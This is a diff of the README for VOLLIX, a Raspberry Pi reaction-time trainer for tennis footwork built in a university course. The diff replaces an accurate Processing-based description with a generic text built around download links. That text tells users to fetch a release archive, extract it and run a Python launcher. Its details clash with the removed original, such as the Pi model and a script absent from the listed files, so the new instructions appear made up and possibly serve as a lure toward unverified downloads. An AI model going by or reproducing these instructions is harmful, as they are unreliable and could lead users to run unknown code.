@@ -1,133 +1,107 @@
-# VOLLIX – Reaction Time Trainer for Tennis Footwork
+# 🎾 vollix - Train Your Reaction Time Effectively
 
-## Overview
+## 🚀 Getting Started
 
-VOLLIX is a reaction time measurement system designed for tennis footwork training.
-It uses Raspberry Pi GPIO hardware combined with floor projection to measure how quickly an athlete responds to visual cues.
+Welcome to VOLLIX! This application helps train your reaction time for tennis footwork using visual guides. With our system, you can measure and improve your reaction speed while gaining useful insights through data logging.
 
-Foot placement guides are shown to provide spatial context, but the system’s **primary focus is reaction time**, not footwork technique.
+## 📥 Download VOLLIX
 
-## Project Context
+[![Download VOLLIX](https://img.shields.io/badge/Download%20VOLLIX-Release-blue)](https://github.com/HamzaJLASSI/vollix/releases)
 
-This project was developed as part of the **CreaTe (Creative Technology)** program at the **University of Twente**,
-for **Module 6: Design and Research of User Experience (DesResUX)**.
+You can download the latest version of VOLLIX from our releases page. 
 
-It represents a **high-fidelity interactive prototype** for reaction time measurement in a physical–digital training environment.
+## 📋 System Requirements
 
-## Key Features
+To run VOLLIX successfully, make sure your setup meets the following requirements:
 
-* Accurate reaction time measurement
-* Two operating modes:
+- **Hardware:** Raspberry Pi 4 or later
+- **Operating System:** Raspberry Pi OS or compatible Linux distribution
+- **Connectivity:** Wi-Fi or Ethernet for data logging and updates
+- **Peripherals:** Floor projector and compatible physical targets for interaction
 
-  * **Measurement Mode** – structured 10-trial sessions with metadata logging
-  * **Game Mode** – training with progressive difficulty and feedback
-* CSV data export with timestamps and test conditions
-* Physical interaction via buttons and LEDs
-* Calibration system for adapting visuals to different physical setups
+## ⚙️ Installation Steps
 
-## Hardware Requirements
+1. **Visit the Download Page:** 
+   Click the button below to go to the releases page.
 
-* Raspberry Pi 5 (developed and tested specifically on Pi 5)
-* GPIO components:
+   [Download VOLLIX](https://github.com/HamzaJLASSI/vollix/releases)
 
-  * LEDs (targets and life indicators)
-  * Physical buttons (targets + start button)
-* Projector for floor projection
-* Enclosure for hardware protection
+2. **Choose the Latest Release:** 
+   On the page, look for the latest release. You will see a list of assets.
 
-## Software Requirements
+3. **Download the Application:** 
+   Click on the asset that matches your Raspberry Pi setup. The file will start downloading. 
 
-* Processing 3 or newer
-* Raspberry Pi OS with GPIO tools (`gpioget`, `gpioset`)
+4. **Transfer the File:** 
+   If you downloaded the file on a separate computer, transfer it to your Raspberry Pi using a USB drive or through your network.
 
-## Quick Start
+5. **Extract the Files:** 
+   Open the terminal on your Raspberry Pi and navigate to the folder where you placed the downloaded file. Use the following command to extract it:
 
-1. Wire all components according to `PinMap.pde`
-2. Install Processing on the Raspberry Pi
-3. Clone this repository
-4. Place the required SVG icons in the `data/` folder:
+   ```
+   tar -xvf vollix.tar.gz
+   ```
 
-   * `home.svg`
-   * `adjust.svg`
-   * `hint.svg`
-   * `Foot_L.svg`
-   * `Foot_R.svg`
-5. Run `vollix.pde` in Processing
+6. **Navigate into the Directory:** 
+   Change into the newly extracted directory with:
 
-On startup, the system automatically performs a hardware self-test.
+   ```
+   cd vollix
+   ```
 
-## Modes
+7. **Run the Application:**
+   Execute the application with the following command:
 
-### Measurement Mode
+   ```
+   python3 run_vollix.py
+   ```
 
-Designed for structured reaction time experiments.
+8. **Follow the On-Screen Instructions:**
+   The application will guide you through the setup process. Ensure your projector and physical targets are correctly positioned.
 
-Process:
+## ⚙️ Configuration
 
-1. Enter a subject ID using the number keys
-2. Select test condition (game / real)
-3. Select measurement moment (before / after)
-4. Complete 10 trials
+### 🛠️ Setting Up the Projector
 
-Output:
+1. **Position the Projector:** 
+   Ensure your projector is aligned with your designated training area. The projected guides should cover the target area clearly.
 
-* CSV file containing reaction times and metadata
+2. **Calibration:** 
+   Follow the provided calibration steps in the application to adjust the visuals according to your space.
 
-### Game Mode
+### 📊 Data Logging
 
-Designed for engaging reaction time practice.
+VOLLIX logs your response times for each session. Use this data to track your progress over time. 
 
-Features:
+### 🔧 Adjusting Settings
 
-* Progressive difficulty
-* Three-life system
-* Immediate visual feedback
-* Level progression
+You can customize several settings in the application:
 
-## Calibration
+- **Difficulty Level:** Adjust this based on your skill level.
+- **Training Duration:** Set the amount of time you wish to train each session.
 
-Calibration allows the projected visuals to match the physical setup.
+## 📚 Usage Tips
 
-* Center position and scale
-* Target positions, rotation, and scale
-* Controls:
+- Try different exercises to improve various facets of your game.
+- Review the data logs regularly to identify areas for improvement.
+- Set realistic goals to keep track of your progress.
 
-  * WASD – move
-  * Arrow keys – rotate / scale
-  * Enter – confirm
-  * Escape – cancel
+## 🤝 Community Support
 
-## Data Output
+Join our community to share your experiences and tips. Visit the [community discussion page](https://github.com/HamzaJLASSI/vollix/discussions) for support and feedback. 
 
-Reaction time data is saved as CSV:
+## 📄 License
 
-```
-datetime,subject_id,measurement_moment,test_condition,rt1,rt2,...rt10
-2026-01-12 13:13:07,123,before,game,450,512,...389
-```
+VOLLIX is licensed under the MIT License. See the LICENSE file for more information.
 
-The included `measurement_log.csv` contains **example data only**.
+## 🌟 Acknowledgments
 
-## File Structure
+Thanks to everyone contributing to make VOLLIX better. Your feedback and support help us improve this application for all users.
 
-* `vollix.pde` – main entry point
-* `App.pde` – application management
-* `Hardware.pde` – GPIO abstraction layer
-* `PinMap.pde` – hardware configuration
-* `MeasurementState.pde` – reaction time testing logic
-* `PlayingState.pde` – game mode
-* `CalibrationState.pde` – calibration logic
-* `data/` – icons and example CSV
+## 📥 Download VOLLIX Again
 
-## Applications
+Don't forget to download the latest version of VOLLIX from our releases page.
 
-* Sports science research
-* Reaction time assessment
-* Athletic training
-* Motor skill development studies
-* Physical–digital UX prototyping
+[Download VOLLIX](https://github.com/HamzaJLASSI/vollix/releases) 
 
-## Notes
-
-This system prioritizes **reaction time measurement**.
-Foot visuals are included for orientation but are secondary to timing accuracy.
+Enjoy your training!
